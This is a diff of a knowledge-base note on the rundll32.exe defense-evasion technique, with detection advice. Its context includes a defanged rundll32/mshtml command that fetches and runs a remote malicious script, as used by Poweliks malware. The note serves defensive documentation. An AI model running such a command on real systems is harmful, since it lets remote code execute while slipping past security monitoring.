@@ -19,6 +19,8 @@ tactics:
 
 The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. [1]Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"  This behavior has been seen used by malware such as Poweliks. [2]
 
+
+
 # Detection
 
 Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.
@@ -117,3 +119,5 @@ Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reducti
 
 - [[Defense Evasion|TA0005 - Defense Evasion]]
 - [[Execution|TA0002 - Execution]]
+
+
